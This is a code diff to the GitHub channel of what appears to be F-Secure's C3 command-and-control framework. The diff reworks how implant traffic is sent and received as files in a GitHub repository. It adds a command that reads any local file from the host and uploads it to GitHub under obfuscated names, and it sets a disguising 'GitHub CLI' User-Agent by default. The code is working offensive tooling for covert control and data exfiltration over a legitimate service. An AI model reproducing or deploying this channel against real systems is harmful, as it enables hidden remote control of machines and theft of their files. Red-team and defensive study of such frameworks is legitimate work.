@@ -1,6 +1,7 @@
 #include "Stdafx.h"
 #include "Github.h"
 #include "Common/FSecure/Crypto/Base64.h"
+#include <fstream>
 
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 FSecure::C3::Interfaces::Channels::Github::Github(ByteView arguments)
@@ -14,9 +15,11 @@ FSecure::C3::Interfaces::Channels::Github::Github(ByteView arguments)
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 size_t FSecure::C3::Interfaces::Channels::Github::OnSendToChannel(ByteView data)
 {
-	// There is a cap on uploads of files >150mb at which point different APIs are required.
+	// There is a cap on uploads of files >100 at which point different APIs are required.
 	data = data.SubString(0, 100 * 1024 * 1024);
-	m_githubObj.WriteMessageToFile(m_outboundDirectionName, data);
+
+	auto filename = m_outboundDirectionName + '-' + FSecure::Utils::GenerateRandomString(10) + '-' + std::to_string(FSecure::Utils::MilisecondsTimestamp());
+	m_githubObj.UploadFile(data, filename);
 	return data.size();
 }
 
@@ -24,10 +27,21 @@ size_t FSecure::C3::Interfaces::Channels::Github::OnSendToChannel(ByteView data)
 std::vector<FSecure::ByteVector> FSecure::C3::Interfaces::Channels::Github::OnReceiveFromChannel()
 {
 	std::vector<ByteVector> ret;
-	for (auto& [ts, id] : m_githubObj.GetMessagesByDirection(m_inboundDirectionName))
+	auto files = m_githubObj.GetMessagesByDirection(m_inboundDirectionName);
+	std::sort(begin(files), end(files), [&](GithubApi::FileEntry const& file, GithubApi::FileEntry const& file2)
+		{
+			auto getTimestampFromFilename = [](std::string const& filename)
+			{
+				auto ts = std::string{ FSecure::Utils::Split(filename, "-").at(2) };
+				return std::stoull(ts);
+			};
+			return getTimestampFromFilename(file.m_Name) < getTimestampFromFilename(file2.m_Name);
+		}
+	);
+	for (auto& file : files)
 	{
-		ret.push_back(m_githubObj.ReadFile(id));
-		m_githubObj.DeleteFile(id);
+		ret.push_back(m_githubObj.ReadFile(file.m_DownloadUrl));
+		m_githubObj.DeleteFile(file);
 	}
 
 	return ret;
@@ -53,7 +67,15 @@ FSecure::ByteVector FSecure::C3::Interfaces::Channels::Github::OnRunCommand(Byte
 
 void FSecure::C3::Interfaces::Channels::Github::UploadFile(ByteView args)
 {
-	m_githubObj.UploadFile(args.Read<std::string>());
+	std::filesystem::path filepathForUpload = args.Read<std::string>();
+	auto readFile = std::ifstream(filepathForUpload, std::ios::binary);
+
+	ByteVector packet = ByteVector{ std::istreambuf_iterator<char>{readFile}, {} };
+
+	std::string ts = std::to_string(FSecure::Utils::TimeSinceEpoch());
+	std::string fn = filepathForUpload.filename().string();  // retain same file name and file extension for convenience.
+	std::string filename = OBF("upload-") + FSecure::Utils::GenerateRandomString(10) + OBF("-") + ts + OBF("-") + fn;
+	m_githubObj.UploadFile(packet, filename);
 }
 
 
@@ -103,7 +125,9 @@ const char* FSecure::C3::Interfaces::Channels::Github::GetCapability()
 			{
 				"type": "string",
 				"name": "User-Agent Header",
-				"description": "The User-Agent header to set. Warning: adding user agent header of web browser, can cause site security provider to block access to api, and prevent channel from functioning."
+				"description": "The User-Agent header to set. The API requires a UA is set. Warning: adding user agent header of web browser, can cause site security provider to block access to api, and prevent channel from functioning.",
+				"min": 1,
+				"defaultValue": "GitHub CLI v1.2.3"
 			}
 		]
 	},
